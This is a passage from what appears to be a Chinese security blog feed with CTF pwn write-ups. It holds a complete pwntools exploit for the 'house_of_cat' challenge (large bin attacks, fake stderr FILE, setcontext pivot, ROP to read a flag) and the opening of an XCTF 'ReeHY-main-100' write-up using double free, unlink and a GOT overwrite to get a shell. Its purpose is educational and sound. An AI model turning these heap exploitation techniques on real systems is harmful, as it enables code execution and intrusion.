attack轻松修改这里的值，由此我们就可以在<code>fake stderr+0xE8</code>处写入处理后的地址值，然后就可以实现任意地址执行。由于本题开启了沙箱，因此这里容易想到跳转到一个称为pcop的gadget，由于在新版本libc中<code>setcontext</code>函数中对<code>rsp</code>赋值的地址不再由<code>rdi</code>取值，因此需要这一个gadget将<code>rdx</code>赋值，其中的<code>rdi</code>附近内存是我们可控的，因此通过这个gadget地址我们就可以控制<code>rdx</code>的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000001675B0                 mov     rdx, [rdi+8]</span><br><span class="line">.text:00000000001675B4                 mov     [rsp+0C8h+var_C8], rax</span><br><span class="line">.text:00000000001675B8                 call    qword ptr [rdx+20h]</span><br></pre></td></tr></table></figure><p>我们可以将<code>rdx</code>赋值为一个可控的内存空间地址，然后通过<code>call</code>指令跳转到<code>setcontext</code>函数中就可以成功实现栈迁移。</p><p>现在我们已经搞清楚了如何通过假的<code>stderr</code>实现任意代码执行，但我们应该如何替换<code>stderr</code>呢？前面提到，我们需要使用一次<code>large bin attack</code>修改<code>pointer_guard</code>的值，在这里，我们还需要再进行一次<code>large bin attack</code>直接修改<code>stderr</code>的值。注意到<code>large bin</code>的前32个bin所保存的chunk的大小差值为0x40，即大小在0x400<del>0x430的chunk保存在第一个<code>large bin</code>，而0x440</del>0x470则保存在第二个<code>large bin</code>中，两个相邻的bin中保存的最小chunk的大小之差为0x40。从本题可以分配的chunk大小可知，我们一共可以进行2次<code>large bin attack</code>，这两次攻击应发生在不同的bin中。</p><p>现在，我们也已经有了办法替换<code>stderr</code>，但还有最后一个问题：如何才能让<code>top chunk</code>缩小？根据本题的UAF漏洞不难联想，这一题应该是想要让我们通过UAF漏洞修改<code>top chunk</code>的大小。具体的步骤如下：</p><p>我们需要首先分配两个相邻chunk，假设大小均为0x440，并在其高地址处分配至少一个chunk暂时防止与<code>top chunk</code>合并。然后释放两个相邻chunk，释放后二者会进行合并。此时再次分配一个大小为0x430的chunk和一个0x450的chunk重新获取这两个chunk的内存空间，修改原来被释放的chunk的头部。由于我们还保存着原来chunk的指针，因此可以再一次释放这个chunk，使其与top chunk直接合并，然后继续编辑就可以成功修改top chunk的大小。</p><p><img src="https://img-blog.csdnimg.cn/4bcabd534346453199fbb541af819235.png"></p><h2 id="Step-3-编写exp"><a href="#Step-3-编写exp" class="headerlink" title="Step 3: 编写exp"></a>Step 3: 编写exp</h2><p>为了行文逻辑流畅，这里先将exp贴出来，然后再对其中细节进行深入分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./house_of_cat&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_cat&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">main_arena_base = <span class="number">0x219C80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_cat</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWB QWXF\xFF$&#x27;</span>)  <span class="comment"># enter the menu</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat choice:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_cat</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWB QWXF\xFF$&#x27;</span>)  <span class="comment"># enter the menu</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat choice:\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_cat</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWB QWXF\xFF$&#x27;</span>)  <span class="comment"># enter the menu</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat choice:\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_cat</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWB QWXF\xFF$&#x27;</span>)  <span class="comment"># enter the menu</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat choice:\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;LOGIN | r00t QWB QWXFadmin\x00&#x27;</span>)  <span class="comment"># admin = 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add_cat(0, 0x430, b&#x27;colin&#x27;)</span></span><br><span class="line">add_cat(<span class="number">1</span>, <span class="number">0x428</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">2</span>, <span class="number">0x430</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">4</span>, <span class="number">0x418</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">5</span>, <span class="number">0x440</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete_cat(<span class="number">1</span>)</span><br><span class="line">show_cat(<span class="number">1</span>)</span><br><span class="line">io.recv(<span class="number">9</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">96</span></span><br><span class="line">base = main_arena - main_arena_base</span><br><span class="line">stderr = base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">tcbhead_t = base - <span class="number">0x28C0</span></span><br><span class="line">_IO_cookie_jumps = base + <span class="number">0x215B80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">add_cat(<span class="number">3</span>, <span class="number">0x440</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete_cat(<span class="number">4</span>)</span><br><span class="line">show_cat(<span class="number">1</span>)</span><br><span class="line">io.recv(<span class="number">25</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x290</span></span><br><span class="line"></span><br><span class="line">edit_cat(<span class="number">1</span>, p64(main_arena + <span class="number">1104</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(tcbhead_t + <span class="number">0x10</span>))</span><br><span class="line">add_cat(<span class="number">0</span>, <span class="number">0x430</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">pointer_guard = heap_base + <span class="number">0xB00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pointer_guard))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># some useful gadgets</span></span><br><span class="line">pcop = <span class="number">0x1675B0</span> + base</span><br><span class="line">pop_rdi = <span class="number">0x2A3E5</span> + base</span><br><span class="line">pop_rsi = <span class="number">0x2BE51</span> + base</span><br><span class="line">pop_rdx_rbx = <span class="number">0x90529</span> + base</span><br><span class="line">pop_rax = <span class="number">0x45EB0</span> + base</span><br><span class="line">syscall = <span class="number">0x91396</span> + base</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pcop))</span><br><span class="line">encrypted_addr = ((pcop ^ pointer_guard) &lt;&lt; <span class="number">0x11</span>) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>) + \</span><br><span class="line">                 (((pcop ^ pointer_guard) &amp; (((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>) - ((<span class="number">1</span> &lt;&lt; <span class="number">47</span>) - <span class="number">1</span>))) &gt;&gt; <span class="number">47</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create fake _IO_FILE struct for fake stderr</span></span><br><span class="line">payload = FileStructure()</span><br><span class="line">payload.vtable = _IO_cookie_jumps + <span class="number">0x38</span>  <span class="comment"># address of _IO_file_xsputn, vtable + 0x38 = _IO_cookie_read</span></span><br><span class="line">payload._lock = base + <span class="number">0x21BA70</span>  <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">payload = <span class="built_in">bytes</span>(payload)[<span class="number">0x10</span>:]</span><br><span class="line">payload += p64(heap_base + <span class="number">0x28F0</span> + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(encrypted_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x28F0</span> + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use SigReturn frame to set rsp and rcx</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base + <span class="number">0x28F0</span> + <span class="number">0x300</span></span><br><span class="line">frame.rip = pop_rdi + <span class="number">1</span></span><br><span class="line">payload += flat(frame)[<span class="number">0x28</span>:]</span><br><span class="line">payload = payload.ljust(<span class="number">0x300</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># construct ROP chain</span></span><br><span class="line"><span class="comment"># close the stdin, and it will reopen automatically</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(base + libc.symbols[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># open file ./flag</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x28F0</span> + <span class="number">0x400</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)  <span class="comment"># syscall code for open</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read file ./flag to heap</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x500</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(base + libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># write content in ./flag</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x500</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(base + libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>) + <span class="string">b&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">add_cat(<span class="number">6</span>, <span class="number">0x430</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">7</span>, <span class="number">0x450</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">8</span>, <span class="number">0x430</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">9</span>, <span class="number">0x440</span>, payload)</span><br><span class="line">add_cat(<span class="number">10</span>, <span class="number">0x430</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">delete_cat(<span class="number">6</span>)</span><br><span class="line">delete_cat(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add_cat(<span class="number">11</span>, <span class="number">0x460</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x430</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x461</span>))</span><br><span class="line">add_cat(<span class="number">12</span>, <span class="number">0x420</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete_cat(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add_cat(<span class="number">13</span>, <span class="number">0x450</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x1101</span>))</span><br><span class="line">delete_cat(<span class="number">7</span>)</span><br><span class="line">add_cat(<span class="number">14</span>, <span class="number">0x460</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete_cat(<span class="number">9</span>)</span><br><span class="line">delete_cat(<span class="number">12</span>)</span><br><span class="line">delete_cat(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete_cat(11)</span></span><br><span class="line">edit_cat(<span class="number">7</span>, p64(base + <span class="number">0x21A0E0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>] - <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x201</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWB QWXF\xFF$&#x27;</span>)  <span class="comment"># enter the menu</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;plz input your cat choice:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;plz input your cat idx:\n&#x27;</span>, <span class="string">b&#x27;15&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># time.sleep(1)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;plz input your cat size:\n&#x27;</span>, <span class="string">b&#x27;1129&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>前面的交互就不用说了，首先是释放chunk 1和4获取到libc和heap地址，并顺便使用0x400~0x430的large bin的large bin attack修改<code>tcbhead_t</code>结构体中的<code>pointer_guard</code>。<code>pcop</code>变量就是前面提到的pcop地址，<code>encrypted_addr</code>就是处理后的地址，经过<code>_IO_cookie_read</code>函数处理后能够变成<code>pcop</code>地址。</p><p>在payload中首先是<code>_IO_FILE</code>结构体，可以使用<code>pwntools</code>自带的<code>FileStructure</code>类进行声明，如果需要将其转为字节可使用<code>bytes()</code>函数进行处理。这里需要注意我们舍去了<code>_IO_FILE</code>的前0x10字节，因为large bin attack只能够将chunk地址写到<code>stderr</code>中，在可写头前面还有<code>prev_size</code>和<code>size</code>字段，为了保证对齐，需要舍弃<code>_IO_FILE</code>结构体的前0x10字节。</p><p>在<code>_IO_FILE</code>结构体后加上这个地方的堆地址和处理后的pcop地址，能够保证<code>_IO_cookie_read</code>函数能够跳转到pcop中。以0x100对齐后加上<code>setcontext</code>函数地址使得pcop能够调用到<code>setcontext</code>函数。</p><p>在<code>setcontext</code>后面紧跟<code>SigReturnFrame</code>结构体，这个结构体本来是用作系统调用<code>sysreturn</code>的，这里使用是因为其中<code>rsp</code>和<code>rip</code>的值正好能够对应上<code>setcontext</code>函数中的相关指令，能够通过修改<code>SigReturnFrame</code>结构体使得<code>setcontext</code>将<code>rsp</code>修改为我们想要栈迁移的地址，<code>rip</code>修改为我们想要跳转到的地址。注意这里的<code>SigReturnFrame</code>结构体舍弃了前面的0x28字节，原因与<code>_IO_FILE</code>舍弃前0x10字节类似，都是为了对齐。</p><p>在此之后就是ROP链，将<code>rsp</code>设置到这里，待<code>setcontext</code>返回后即可在这里继续执行，后面就是常规的orw。</p><p><img src="https://img-blog.csdnimg.cn/81cfd60bfff549048f32a9b4f50ef1ba.png"><br>成功getshell。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>理解本题的关键在于理解函数调用链：<br><code>calloc-&gt;_int_malloc-&gt;sysmalloc-&gt;__malloc_assert-&gt;__fxprintf-&gt;...-&gt;_IO_cookie_read-&gt;pcop-&gt;setcontext-&gt;ROP</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF攻防世界 4-ReeHY-main-100 题解</title>
      <link href="/2023/02/28/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-4-ReeHY-main-100-%E9%A2%98%E8%A7%A3/"/>
      <url>/2023/02/28/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-4-ReeHY-main-100-%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>昨天整理做过的题目时发现的这道题，简单看了下觉得挺有参考意义的，在此回顾。</p><p>源文件：<a href="https://github.com/Hornos3/pwnfile">my_github</a></p><p>这是一道典型的堆题。内部一共实现了增加、删除、编辑3个功能。</p><p><img src="https://img-blog.csdnimg.cn/2ee95fd1554c4d8389935fd4861e5a6e.png#pic_center"></p><p>经过分析，漏洞主要有：</p><ol><li>在create_exploit函数中的两个整型溢出漏洞，使chunk地址可以写到缓冲区的高地址处</li><li>在delete_exploit函数中的double free漏洞，释放后没有清空指针</li></ol><p><img src="https://img-blog.csdnimg.cn/c6d980fd9dcd476c8da8d3e86131576a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><img src="https://img-blog.csdnimg.cn/d905f5927a40456b80782ae8ec1278f5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>经过gdb调试发现，bss段中对于chunk相关信息的存储结构如下：</p><p><img src="https://img-blog.csdnimg.cn/b60958c8490b4a7e9960383f12faad6f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>在create一个chunk时，程序会将chunk的size写入chunksize_bank_chunk这个chunk中，但如果输入的索引为负数，就会导致size写入到前面的内容中。索引值为-1可以修改这个chunk的size，索引值为-2时可以将这个chunk的size改得很大很大。同时注意，在索引值为-2时，申请的chunk会将chunksize_bank_chunk覆盖掉，也就是0x6020C0的位置，这个地方变成了我们自己申请的chunk了。这样可以将前面分配的chunk的size修改掉，从而可以在edit函数中触发堆溢出。</p><p>看来这道题能做文章的漏洞有很多，但是还有一个问题就是，如何获取libc地址？程序中并没有输出的操作。但是，plt表中有puts函数。我们将free函数的got表地址改成puts的plt，就能够实现输出，当然前提是这个chunk要在got表的地方，这样才能拿到got表的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0000000000602018 off_602018      dq offset free          ; DATA XREF: _free↑r</span><br><span class="line">.got.plt:0000000000602020 off_602020      dq offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0000000000602028 off_602028      dq offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0000000000602030 off_602030      dq offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0000000000602038 off_602038      dq offset memcpy        ; DATA XREF: _memcpy↑r</span><br><span class="line">.got.plt:0000000000602040 off_602040      dq offset malloc        ; DATA XREF: _malloc↑r</span><br><span class="line">.got.plt:0000000000602048 off_602048      dq offset fflush        ; DATA XREF: _fflush↑r</span><br><span class="line">.got.plt:0000000000602050 off_602050      dq offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:0000000000602058 off_602058      dq offset atoi          ; DATA XREF: _atoi↑r</span><br><span class="line">.got.plt:0000000000602060 off_602060      dq offset exit          ; DATA XREF: _exit↑r</span><br></pre></td></tr></table></figure><p>要修改的是0x602018，那么应该将chunk分配到0x602008的地方。我们需要进行一次double_free操作。</p><p>经过gdb调试发现，在glibc 2.27及更高版本无法进行此次double free，因为在_int_free中加入了检查tcache的double free，但2.23中没有发现这类检查代码，因此转到2.23进行调试。</p><p>double_free之后UAF，将fd改为0x602008。我满怀期待地执行下一步，gdb却给我来了当头一棒——<code>malloc(): memory corruption (fast)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">errout:</span><br><span class="line">  malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查通不过：目的地址对应的size必须正确。</p><p>看来这条路是走不通了。看下一个思路：unlink。</p><p>如果是使用unlink的话，就无需考虑是否存在tcache了。如果有tcache则分配一个large bins大小的chunk让它被释放时不进tcache就好了。</p><p>记得在之前的how2heap分析中，对于unlink是直接将后面chunk的prev_inuse置为0的。这里我们不能直接这样做，而是需要利用未被清空的指针。</p><p>Step 1: 分配两个非tcache chunk并释放。释放之后，这两个chunk会被合并入top chunk中，绕过double free的检测。<br>Step 2: 分配一个大chunk使得这个chunk能够包含之前的两个chunk且还要多出一些空间。这一步是为了编辑这两个原先的chunk做准备的。这个大chunk和Step 1中第一个分配的chunk的地址应该是相同的。<br>Step 3: 在大chunk中构造数据，在原chunk_1前后构造假chunk使free能够通过检查。<br>Step 4: 释放原chunk_1。</p><p><strong>注意：在大chunk中需要在原chunk_1前后均伪造，这是为了通过unlink和_int_free的检查。在后方构造chunk主要构造其prev_inuse位为1以绕过line 4316 (glibc 2.31)的检查，在前方构造chunk是为了绕过unlink的检查，在how2heap中有分析，如有疑问请移步我之前写的how2heap分析文章，这里不再赘述。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br></pre></td></tr></table></figure><p>这样，释放chunk_1就能够成功，chunk_0的地址也会被修改到bss段上（0x6020C8）。我们现在可以通过chunk_0随意修改bss段中保存有chunk信息的部分了。之后的操作就是水到渠成：</p><p>Step 5: 将chunk_1的地址改为free的got表地址，修改为puts的plt地址。<br>Step 6: 将chunk_2的地址改为got表中除前两个函数外其他任意一个函数的地址，然后调用free输出地址。利用此地址计算libc的加载地址。<br>Step 7: 将计算得到的system地址写到free的got表地址中，向chunk_3写入’&#x2F;bin&#x2F;sh’（或者找到libc中本来就有的’&#x2F;bin&#x2F;sh’字符串地址，将其写到chunk_3的位置上）。<br>Step 8: 释放chunk_3，getshell。</p><p>payload: （本payload在Kali上测试成功，libc版本：Debian GLIBC 2.33-6，2022&#x2F;4&#x2F;5最新更新版本）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 